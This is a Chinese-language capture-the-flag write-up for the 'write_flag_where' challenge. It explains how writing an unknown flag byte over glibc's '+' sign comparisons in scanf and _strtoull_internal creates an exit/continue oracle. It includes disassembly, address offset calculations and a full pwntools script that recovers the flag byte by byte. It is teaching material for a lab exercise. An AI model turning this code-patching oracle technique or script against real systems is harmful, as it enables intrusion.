# write_flag_where

## 题目简述

程序不会直接输出 flag，但允许把 `d3ctf{...}` 内指定偏移的一个字节写到 libc 代码段中的任意位置。flag 格式已知为十六进制字符串：

```text
d3ctf{[a-f0-9]{n}}
```

因此可把未知 flag 字节写进 glibc 数字解析代码的“正号字符”立即数，再向 `scanf("%lu%u")` 输入候选字符。若候选与被写入的 flag 字节相同，它会被当作符号；否则会按普通字符或数字处理。两种路径对第一个转换是否成功、程序是否继续等待第二个整数的影响不同，由此构造逐字节 oracle。

## 解题过程

### 选择可覆写的比较立即数

glibc 的 `scanf` 在解析整数时先检查正负号：

```c
c = inchar();
if (c == L_('-') || c == L_('+')) {
    char_buffer_add(&charbuf, c);
    if (width > 0) {
        --width;
    }
    c = inchar();
}
```

题目 libc 中对应的第一处指令为：

```text
.text:0000000000068BFA  sub eax, 2Bh
.text:0000000000068BFD  lea rdx, [r15+1]
.text:0000000000068C01  and eax, 0FFFFFFFDh
.text:0000000000068C04  jnz short loc_68C69
```

其中 `0x2b` 是字符 `+`。把这个立即数字节改成未知 flag 字节后，该字节会被视作符号字符。仅修改这一处仍会导致后续转换结果不一致，还需同步修改 `_strtoull_internal` 中的比较：

```text
.text:0000000000054686  mov [rsp+58h+var_3C], 0
.text:000000000005468E  cmp r15b, 2Bh
.text:0000000000054692  jz  loc_54810
```

两处需要覆盖的立即数字节虚拟地址分别为：

```text
0x68bfa + 2 = 0x68bfc
0x5468e + 3 = 0x54691
```

服务输出的是 libc 可执行映射起点，而该映射对应 ELF 虚拟地址 `0x26000`，所以运行时写入地址为：

$$
\mathrm{addr}_1=\mathrm{map\_base}+0x68bfc-0x26000
$$

$$
\mathrm{addr}_2=\mathrm{map\_base}+0x54691-0x26000
$$

每次连接把同一个 flag 偏移写到这两处，即可让该未知字节同时替代两处 `+`。

### 区分字母与数字

程序随后执行 `scanf("%lu%u")`，候选字符来自 `abcdef0123456789`。

候选是字母时，发送 `c1`：

- 若 `c` 等于未知字节，`c` 被当作符号，后面的 `1` 完成第一个 `%lu`，程序继续等待第二个 `%u`；
- 若 `c` 不等于未知字节，字母无法启动整数转换，第一个转换立即失败，程序退出。

候选是数字时，只发送 `c`：

- 若 `c` 等于未知字节，它被当作符号，但后面没有数字，第一个转换失败，程序退出；
- 若 `c` 不等于未知字节，它正常完成第一个 `%lu`，程序继续等待第二个 `%u`。

因此字母与数字的 oracle 恰好相反：

| 候选类型 | 连接保持、等待输入 | 连接退出 |
|---|---|---|
| `a` 至 `f` | 猜中 | 猜错 |
| `0` 至 `9` | 猜错 | 猜中 |

### 逐字节恢复

下面的脚本去除了原题解中的固定测试地址。运行时使用 `HOST=<主机> PORT=<端口>` 传入当前实例：

```python
#!/usr/bin/env python3
import re

from pwn import *


context.log_level = "info"

if not args.HOST or not args.PORT:
    log.error("usage: python3 exp.py HOST=<host> PORT=<port>")

HOST = args.HOST
PORT = int(args.PORT)

LIBC_TEXT_VADDR = 0x26000
SCANF_SIGN_IMMEDIATE = 0x68BFA + 2
STRTOULL_SIGN_IMMEDIATE = 0x5468E + 3


def receive_banner(io):
    mapping_start = int(io.recvuntil(b"-", drop=True), 16)
    remainder = io.recvuntil(b"}}\n")
    return mapping_start, remainder


def get_inner_length() -> int:
    io = remote(HOST, PORT)
    _, banner = receive_banner(io)
    io.close()

    match = re.search(rb"d3ctf\{\[a-f0-9\]\{(\d+)\}\}", banner)
    if not match:
        raise ValueError(f"flag format not found in banner: {banner!r}")
    return int(match.group(1))


def connection_exits(candidate: str, flag_offset: int) -> bool:
    io = remote(HOST, PORT)
    code_map, _ = receive_banner(io)

    first = code_map + SCANF_SIGN_IMMEDIATE - LIBC_TEXT_VADDR
    second = code_map + STRTOULL_SIGN_IMMEDIATE - LIBC_TEXT_VADDR

    for address in (first, second):
        io.sendline(str(address).encode())
        io.sendline(str(flag_offset).encode())

    if candidate.isdigit():
        io.sendline(candidate.encode())
    else:
        io.sendline((candidate + "1").encode())

    try:
        io.recv(timeout=0.2)
        exited = False
    except EOFError:
        exited = True
    finally:
        io.close()

    return exited


def is_correct(candidate: str, flag_offset: int) -> bool:
    exited = connection_exits(candidate, flag_offset)
    return exited if candidate.isdigit() else not exited


inner_length = get_inner_length()
known = "d3ctf{"

for offset in range(6, 6 + inner_length):
    for candidate in "abcdef0123456789":
        if is_correct(candidate, offset):
            known += candidate
            log.success("recovered: %s", known)
            break
    else:
        raise RuntimeError(f"no candidate matched offset {offset}")

flag = known + "}"
log.success("flag: %s", flag)
```

网络抖动会影响基于超时的存活判断；如果当前实例延迟较高，应适当增大 `0.2` 秒并对单个候选重复确认。

### 其他可行 oracle

只要能把未知字节写入 libc 代码段，就不必局限于 `scanf`。赛后解法还包括修改 `__stack_chk_fail` 相关路径使程序输出数据，或覆盖某个条件字节后依据进程是否崩溃判定。它们本质上都在把“只写不可读”的 flag 字节转换成可观察的控制流差异。

## 方法总结

本题的核心不是任意地址写本身，而是如何用未知值写构造读取 oracle。预期解选择 `scanf` 的符号判断，是因为比较立即数恰好为单字节，并且 `%lu%u` 提供了清晰的“退出/继续等待”两种状态。

复现时要同时修改 `scanf` 与 `_strtoull_internal` 的相关立即数，并正确处理文件虚拟地址与运行时可执行映射起点之间的 `0x26000` 偏移。字母和数字的判定方向相反，也是脚本最容易写错的地方。
